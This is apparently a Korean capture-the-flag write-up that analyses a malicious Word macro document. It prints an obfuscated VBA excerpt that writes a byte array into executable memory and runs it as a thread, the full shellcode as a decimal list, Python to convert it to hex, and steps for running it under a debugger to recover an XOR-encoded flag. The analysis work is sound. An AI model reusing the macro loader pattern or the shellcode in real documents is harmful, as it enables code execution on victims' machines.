# 👿 문제파일

[output.docm.bin.zip](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e8267c9a-08de-4d95-8f83-271412185797/output.docm.bin.zip)

- passwd : infected

---

# 문제풀이

## RemuxLinux

[Microsoft Office](https://docs.remnux.org/discover-the-tools/analyze+documents/microsoft+office)

### Microsoft Document Analysis

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8fcae04a-ac66-4b71-8b9b-4bdff59c0cd7/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/01361c1a-783a-4a72-900f-363ce628a435/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ddeca4f5-7613-4312-b618-4c7214728650/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e7a09db7-2a0b-4f14-b263-4545636adf42/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6cf0231c-9419-47dd-8f69-5ed2bc08e248/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d6e9f572-c00f-4f80-af7c-e8a9daff1edf/Untitled.png)

```visual-basic
Dim path
path = "C:\Users\sbox\Documents\drop.txt"
Open path For Output As #1
    IIllIIIllII = IlIIIIlI(0, UBound(lIIIIIIIIIIll), &H1000, &H40)
    For IllIllIIIlIllIlIlI = LBound(lIIIIIIIIIIll) To UBound(lIIIIIIIIIIll)
        IlllIIlllllIII = lIIIIIIIIIIll(IllIllIIIlIllIlIlI)
        Print #1, IlllIIlllllIII
        llIllllIlllIlI = lIIIlIIIl(IIllIIIllII + IllIllIIIlIllIlIlI, IlllIIlllllIII, 1)
    Next IllIllIIIlIllIlIlI
    llIllllIlllIlI = IIllIIllIIllllIIl(0, 0, IIllIIIllII, 0, 0, 0)
    Close #1
End Sub
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/58a3b8aa-660f-4788-9104-0198d6020be4/Untitled.png)

## 파이썬을 이용 Dec2Hex

```python
format(0, '#04x')
# - 0x 접두사 사용
0 - 0이 있는 패드
4 - 패딩의 길이, 0x를 포함하기 때문에 4
x - 16진수로 변환

dec_list = [85, 139, 236,]
for i in range(len(dec_list)):
    print(format(int(dec_list[i]), '02x'))

dec_list =  [85, 139, 236, 129, 236, 0, 3, 0, 0, 51, 192, 104, 192, 0, 0, 0, 89, 139, 252, 243, 171, 232, 74, 6, 0, 0, 137, 132, 36, 0, 1, 0, 0, 139, 132, 36, 0, 1, 0, 0, 199, 4, 36, 235, 200, 198, 195, 199, 68, 36, 4, 235, 206, 197, 213, 199, 68, 36, 8, 198, 213, 222, 230, 199, 68, 36, 12, 0, 0, 0, 0, 139, 252, 106, 12, 104, 167, 0, 0, 0, 87, 80, 232, 79, 5, 0, 0, 131, 196, 16, 137, 132, 36, 4, 1, 0, 0, 139, 132, 36, 0, 1, 0, 0, 199, 4, 36, 49, 14, 21, 19, 199, 68, 36, 4, 18, 6, 11, 38, 199, 68, 36, 8, 11, 11, 8, 4, 199, 68, 36, 12, 0, 0, 0, 0, 139, 252, 106, 12, 106, 103, 87, 80, 232, 18, 5, 0, 0, 131, 196, 16, 137, 132, 36, 8, 1, 0, 0, 139, 132, 36, 4, 1, 0, 0, 199, 69, 128, 86, 72, 79, 72, 199, 69, 132, 79, 68, 85, 15, 199, 69, 136, 69, 77, 77, 0, 199, 69, 140, 0, 0, 0, 0, 139, 253, 129, 239, 128, 0, 0, 0, 106, 11, 106, 33, 87, 232, 160, 4, 0, 0, 131, 196, 12, 87, 255, 208, 137, 132, 36, 12, 1, 0, 0, 139, 132, 36, 12, 1, 0, 0, 199, 4, 36, 220, 251, 225, 240, 199, 68, 36, 4, 231, 251, 240, 225, 199, 68, 36, 8, 218, 229, 240, 251, 199, 68, 36, 12, 212, 0, 0, 0, 199, 68, 36, 16, 0, 0, 0, 0, 139, 252, 106, 13, 104, 149, 0, 0, 0, 87, 80, 232, 136, 4, 0, 0, 131, 196, 16, 137, 132, 36, 16, 1, 0, 0, 139, 132, 36, 12, 1, 0, 0, 199, 4, 36, 137, 174, 180, 165, 199, 68, 36, 4, 178, 174, 165, 180, 199, 68, 36, 8, 131, 175, 174, 174, 199, 68, 36, 12, 165, 163, 180, 129, 199, 68, 36, 16, 0, 0, 0, 0, 139, 252, 106, 16, 104, 192, 0, 0, 0, 87, 80, 232, 64, 4, 0, 0, 131, 196, 16, 137, 132, 36, 20, 1, 0, 0, 139, 132, 36, 12, 1, 0, 0, 199, 4, 36, 120, 68, 68, 64, 199, 68, 36, 4, 127, 64, 85, 94, 199, 68, 36, 8, 98, 85, 65, 69, 199, 68, 36, 12, 85, 67, 68, 113, 199, 68, 36, 16, 0, 0, 0, 0, 139, 252, 106, 16, 106, 48, 87, 80, 232, 251, 3, 0, 0, 131, 196, 16, 137, 132, 36, 24, 1, 0, 0, 139, 132, 36, 12, 1, 0, 0, 199, 4, 36, 54, 10, 10, 14, 199, 68, 36, 4, 63, 26, 26, 44, 199, 68, 36, 8, 27, 15, 11, 27, 199, 68, 36, 12, 13, 10, 54, 27, 199, 68, 36, 16, 31, 26, 27, 12, 199, 68, 36, 20, 13, 63, 0, 0, 199, 68, 36, 24, 0, 0, 0, 0, 139, 252, 106, 22, 106, 126, 87, 80, 232, 166, 3, 0, 0, 131, 196, 16, 137, 132, 36, 28, 1, 0, 0, 139, 132, 36, 12, 1, 0, 0, 199, 4, 36, 156, 160, 160, 164, 199, 68, 36, 4, 135, 177, 186, 176, 199, 68, 36, 8, 134, 177, 165, 161, 199, 68, 36, 12, 177, 167, 160, 149, 199, 68, 36, 16, 0, 0, 0, 0, 139, 252, 106, 16, 104, 212, 0, 0, 0, 87, 80, 232, 94, 3, 0, 0, 131, 196, 16, 137, 132, 36, 32, 1, 0, 0, 139, 132, 36, 12, 1, 0, 0, 199, 4, 36, 161, 134, 156, 141, 199, 68, 36, 4, 154, 134, 141, 156, 199, 68, 36, 8, 186, 141, 137, 140, 199, 68, 36, 12, 174, 129, 132, 141, 199, 68, 36, 16, 0, 0, 0, 0, 139, 252, 106, 16, 104, 232, 0, 0, 0, 87, 80, 232, 22, 3, 0, 0, 131, 196, 16, 137, 132, 36, 36, 1, 0, 0, 139, 132, 36, 12, 1, 0, 0, 199, 4, 36, 168, 143, 149, 132, 199, 68, 36, 4, 147, 143, 132, 149, 199, 68, 36, 8, 162, 141, 142, 146, 199, 68, 36, 12, 132, 169, 128, 143, 199, 68, 36, 16, 133, 141, 132, 0, 199, 68, 36, 20, 0, 0, 0, 0, 139, 252, 106, 19, 104, 225, 0, 0, 0, 87, 80, 232, 198, 2, 0, 0, 131, 196, 16, 137, 132, 36, 40, 1, 0, 0, 139, 132, 36, 16, 1, 0, 0, 106, 0, 106, 0, 106, 0, 106, 0, 199, 69, 128, 240, 240, 246, 129, 199, 69, 132, 131, 129, 130, 0, 199, 69, 136, 0, 0, 0, 0, 139, 253, 129, 239, 128, 0, 0, 0, 106, 7, 104, 179, 0, 0, 0, 87, 232, 80, 2, 0, 0, 131, 196, 12, 87, 255, 208, 131, 248, 0, 15, 132, 57, 2, 0, 0, 137, 132, 36, 44, 1, 0, 0, 139, 156, 36, 44, 1, 0, 0, 139, 132, 36, 20, 1, 0, 0, 106, 0, 106, 0, 106, 3, 106, 0, 106, 0, 106, 80, 199, 69, 128, 202, 201, 204, 203, 199, 69, 132, 199, 206, 206, 205, 199, 69, 136, 205, 134, 195, 218, 199, 69, 140, 0, 0, 0, 0, 139, 253, 129, 239, 128, 0, 0, 0, 106, 12, 104, 168, 0, 0, 0, 87, 232, 239, 1, 0, 0, 131, 196, 12, 87, 83, 255, 208, 131, 248, 0, 15, 132, 215, 1, 0, 0, 137, 132, 36, 48, 1, 0, 0, 139, 140, 36, 48, 1, 0, 0, 139, 132, 36, 24, 1, 0, 0, 106, 0, 104, 0, 0, 0, 4, 106, 0, 106, 0, 106, 0, 199, 69, 128, 16, 0, 0, 0, 199, 69, 132, 0, 0, 0, 0, 139, 253, 129, 239, 128, 0, 0, 0, 106, 1, 106, 63, 87, 232, 157, 1, 0, 0, 131, 196, 12, 87, 199, 69, 132, 46, 44, 61, 0, 199, 69, 136, 0, 0, 0, 0, 139, 253, 131, 239, 124, 106, 3, 106, 105, 87, 232, 124, 1, 0, 0, 131, 196, 12, 87, 81, 255, 208, 131, 248, 0, 15, 132, 100, 1, 0, 0, 137, 132, 36, 52, 1, 0, 0, 139, 148, 36, 52, 1, 0, 0, 139, 132, 36, 32, 1, 0, 0, 106, 0, 106, 0, 106, 0, 106, 0, 82, 255, 208, 131, 248, 0, 15, 132, 59, 1, 0, 0, 139, 132, 36, 8, 1, 0, 0, 106, 4, 104, 0, 16, 0, 0, 106, 1, 106, 0, 255, 208, 131, 248, 0, 15, 132, 30, 1, 0, 0, 137, 132, 36, 56, 1, 0, 0, 139, 148, 36, 52, 1, 0, 0, 139, 156, 36, 56, 1, 0, 0, 141, 77, 248, 139, 132, 36, 36, 1, 0, 0, 81, 104, 0, 16, 0, 0, 83, 82, 255, 208, 139, 132, 36, 52, 1, 0, 0, 139, 132, 36, 40, 1, 0, 0, 80, 255, 208, 139, 132, 36, 48, 1, 0, 0, 139, 132, 36, 40, 1, 0, 0, 80, 255, 208, 139, 132, 36, 44, 1, 0, 0, 139, 132, 36, 40, 1, 0, 0, 80, 255, 208, 139, 188, 36, 56, 1, 0, 0, 199, 132, 36, 0, 2, 0, 0, 189, 189, 187, 236, 199, 132, 36, 4, 2, 0, 0, 238, 236, 239, 165, 199, 132, 36, 8, 2, 0, 0, 188, 233, 233, 239, 199, 132, 36, 12, 2, 0, 0, 189, 188, 233, 188, 199, 132, 36, 16, 2, 0, 0, 186, 236, 188, 184, 199, 132, 36, 20, 2, 0, 0, 233, 191, 191, 233, 199, 132, 36, 24, 2, 0, 0, 231, 191, 234, 184, 199, 132, 36, 28, 2, 0, 0, 236, 188, 231, 184, 199, 132, 36, 32, 2, 0, 0, 235, 239, 184, 239, 199, 132, 36, 36, 2, 0, 0, 234, 233, 187, 230, 199, 132, 36, 40, 2, 0, 0, 163, 0, 0, 0, 199, 132, 36, 44, 2, 0, 0, 0, 0, 0, 0, 139, 252, 129, 199, 0, 2, 0, 0, 106, 41, 104, 222, 0, 0, 0, 87, 232, 42, 0, 0, 0, 131, 196, 12, 185, 41, 0, 0, 0, 141, 180, 36, 0, 2, 0, 0, 243, 166, 131, 249, 0, 117, 7, 184, 103, 111, 111, 100, 235, 5, 184, 102, 97, 105, 108, 129, 196, 0, 3, 0, 0, 93, 195, 85, 139, 236, 80, 86, 81, 139, 117, 8, 138, 69, 12, 139, 77, 16, 73, 48, 4, 14, 131, 249, 0, 117, 247, 89, 94, 88, 93, 195, 85, 139, 236, 139, 125, 8, 51, 192, 185, 255, 255, 255, 255, 242, 174, 247, 209, 73, 139, 193, 93, 195, 85, 139, 236, 129, 236, 0, 1, 0, 0, 51, 192, 106, 64, 89, 139, 252, 243, 171, 139, 69, 20, 139, 200, 137, 12, 36, 138, 69, 16, 136, 68, 36, 12, 139, 69, 12, 137, 68, 36, 16, 139, 109, 8, 139, 69, 60, 139, 68, 5, 120, 3, 197, 139, 80, 24, 137, 84, 36, 4, 139, 80, 28, 137, 84, 36, 8, 139, 84, 36, 4, 139, 88, 36, 137, 92, 36, 20, 139, 88, 32, 3, 221, 74, 139, 12, 36, 139, 52, 147, 3, 245, 86, 232, 137, 255, 255, 255, 131, 196, 4, 139, 200, 59, 12, 36, 117, 37, 139, 252, 131, 199, 24, 243, 164, 43, 248, 51, 201, 59, 12, 36, 116, 31, 138, 4, 15, 50, 68, 36, 12, 139, 116, 36, 16, 138, 36, 14, 58, 196, 117, 3]
bin = ''
for i in range(len(dec_list)):
    bin += format(int(dec_list[i]), '02x')
	print(bin)
```

## Cyberchef  Dec2Hex

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/51b86ac5-d1bd-4591-9293-8cfe0714bdcd/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0a6e84a6-b9c0-4c57-aa5e-f9cd37b8baee/Untitled.png)

## shellcode 실행 도구

[GitHub - adamkramer/jmp2it: Transfer EIP control to shellcode during malware analysis investigation](https://github.com/adamkramer/jmp2it)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/129a47aa-9ee9-4068-8989-3d5c333bae2a/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/759aecad-76c6-4d24-9c20-4e7bd82a318a/Untitled.png)

```python
C:>jmp2it.exe drop.bin 0x00 pause
** JMP2IT v1.4 - Created by Adam Kramer [2014] - Inspired by Malhost-Setup **
** As requested, the process has been paused **

To proceed with debugging:
1. Load a debugger and attach it to this process
2. If it has paused, instruct it to start running again
3. Pause the process after a few seconds
4. NOP the EF BE infinite loop which you should be on
5. Step to the CALL immediately after and then 'step into' it

 === You will then be at the shellcode ===
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/26ef2f5f-f290-4c27-a634-47c5741b011f/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a3b7ec94-2987-4493-969d-d2ffae2c76cc/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/082a785f-45a7-4252-9e47-d68332f2f6e3/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/64beacf8-5d8d-41b4-b244-dd7e7a775c80/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8e966ecb-80dd-4510-b220-9b1d66f20cf2/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/559ccde5-87bc-4cf7-a038-9b836f84786c/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6fa7dc39-7230-477d-9efa-77e6069bb226/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2ce1f6e1-0120-4270-b651-d0a9ce58ae35/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7822bf47-3ed7-4837-b181-4ef7b5f176c4/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/69e7475a-39cd-445e-a861-7356dc9aeeca/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d9e785c3-744e-4a91-b602-61219e513bea/Untitled.png)

```python
BD BD BB EC EE EC EF A5 BC E9 E9 EF BD BC E9 BC BA EC BC B8 E9 BF BF E9 E7 BF EA B8 EC BC E7 B8 EB EF B8 EF EA E9 BB E6 A3
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ee88783f-44be-4431-a1c1-069e6e968790/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fb094410-1b43-40be-a20c-4bf353c53b84/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1c5fa79f-77d2-4f5e-9167-f67c8d1197de/Untitled.png)

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/067233b1-4581-4154-8e13-a025da239a0d/Untitled.png)